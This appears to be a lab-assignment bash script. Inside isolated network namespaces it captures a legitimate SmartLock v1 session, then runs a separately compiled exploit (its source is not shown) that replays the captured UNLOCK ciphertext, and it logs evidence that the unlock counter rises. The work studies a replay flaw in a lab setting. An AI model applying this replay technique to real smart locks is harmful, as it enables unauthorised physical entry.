#!/usr/bin/env bash
# Task 5 evidence capture: application-layer replay of a captured SmartLock v1
# UNLOCK record. A normal session is recorded, then the same UNLOCK ciphertext
# is replayed on fresh TCP connections to show the unlock counter climbing.
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
SMARTLOCK_DIR="$LAB_DIR/smartlock"
EVIDENCE_DIR="$LAB_DIR/../23i-0614-G/evidence/taska5_replay"
EXPLOIT_SRC="$LAB_DIR/../23i-0614-G/exploits/23i-0614-G-TASKA5-V1.cpp"
EXPLOIT_BIN="/tmp/exploit_taska5"

mkdir -p "$EVIDENCE_DIR"

# 0. Build the exploit from the deliverables directory
echo "[+] Compiling TASKA5 exploit from $EXPLOIT_SRC..."
g++ -std=c++17 -O2 -Wall "$EXPLOIT_SRC" -o "$EXPLOIT_BIN" -lcrypto

# 1. Reset network
bash "$SCRIPT_DIR/net_setup.sh"

PORT=$(grep -E "^port\s*=" "$SMARTLOCK_DIR/instance.txt" | awk '{print $3}' | tr -d '\r')
echo "[+] Detected Lock Port: $PORT"

killall lock_server 2>/dev/null || true
killall tcpdump 2>/dev/null || true
sleep 0.3

# 2. Start a fresh lock_server so the baseline session is unlock #1
echo "[+] Starting fresh lock_server on VM1 (10.10.10.11)..."
ip netns exec vm1_lock bash -c "cd '$SMARTLOCK_DIR' && exec ./lock_server instance.txt" \
    > /tmp/lock_taska5.log 2>&1 &
sleep 0.8

# 3. Record one legitimate baseline session (counter becomes 1) and export it
BASELINE_PCAP="$EVIDENCE_DIR/taska5_baseline.pcap"
BASELINE_STREAM="$EVIDENCE_DIR/taska5_baseline_stream.txt"
rm -f "$BASELINE_PCAP" "$BASELINE_STREAM"
echo "[+] Capturing baseline session to $BASELINE_PCAP..."
ip netns exec vm2_kali tcpdump -U -i veth_kali -w "$BASELINE_PCAP" \
    "tcp port $PORT" > /dev/null 2>&1 &
sleep 0.8

echo "[+] Running legitimate hub_client for the baseline session..."
set +e
ip netns exec vm2_kali bash -c "cd '$SMARTLOCK_DIR' && ./hub_client instance.txt 10.10.10.11 $PORT" \
    > /tmp/hub_taska5_baseline.log 2>&1
set -e

sleep 1
killall -INT tcpdump 2>/dev/null || true
sleep 0.5

echo "[+] Baseline hub output:"
cat /tmp/hub_taska5_baseline.log

tshark -r "$BASELINE_PCAP" -z "follow,tcp,ascii,0" -q > "$BASELINE_STREAM" 2>&1 || true

# 4. Capture the replay traffic and execute two replay sessions (counter 2, 3)
REPLAY_PCAP="$EVIDENCE_DIR/taska5_replay.pcap"
OUTPUT_FILE="$EVIDENCE_DIR/taska5_output.txt"
rm -f "$REPLAY_PCAP"
echo "[+] Starting replay capture to $REPLAY_PCAP..."
ip netns exec vm2_kali tcpdump -U -i veth_kali -w "$REPLAY_PCAP" \
    "tcp port $PORT" > /dev/null 2>&1 &
sleep 0.8

echo "[+] Replaying the captured UNLOCK record twice from VM2..."
set +e
ip netns exec vm2_kali "$EXPLOIT_BIN" --stream "$BASELINE_STREAM" 10.10.10.11 "$PORT" 2 \
    > "$OUTPUT_FILE" 2>&1
REPLAY_RC=$?
set -e

sleep 1
killall -INT tcpdump 2>/dev/null || true
sleep 0.5

# 5. Query STATUS with a legitimate hub to confirm the persisted counter
STATUS_FILE="$EVIDENCE_DIR/taska5_status.txt"
echo "[+] Querying STATUS with a legitimate hub_client..."
set +e
ip netns exec vm2_kali bash -c "cd '$SMARTLOCK_DIR' && ./hub_client instance.txt 10.10.10.11 $PORT" \
    > "$STATUS_FILE" 2>&1
set -e

killall lock_server 2>/dev/null || true
sleep 0.3

# 6. Export the replay TCP streams (two connections) for the record
STREAM_FILE="$EVIDENCE_DIR/taska5_stream.txt"
echo "[+] Exporting replay TCP streams..."
{
    tshark -r "$REPLAY_PCAP" -z "follow,tcp,ascii,0" -q 2>&1 || true
    tshark -r "$REPLAY_PCAP" -z "follow,tcp,ascii,1" -q 2>&1 || true
} > "$STREAM_FILE"

echo "[+] Exploit output (exit code $REPLAY_RC):"
cat "$OUTPUT_FILE"

echo "[+] Post-attack STATUS output:"
cat "$STATUS_FILE"

echo "[+] Evidence files:"
ls -lh "$EVIDENCE_DIR"

echo "[+] TASKA5 execution finished successfully."
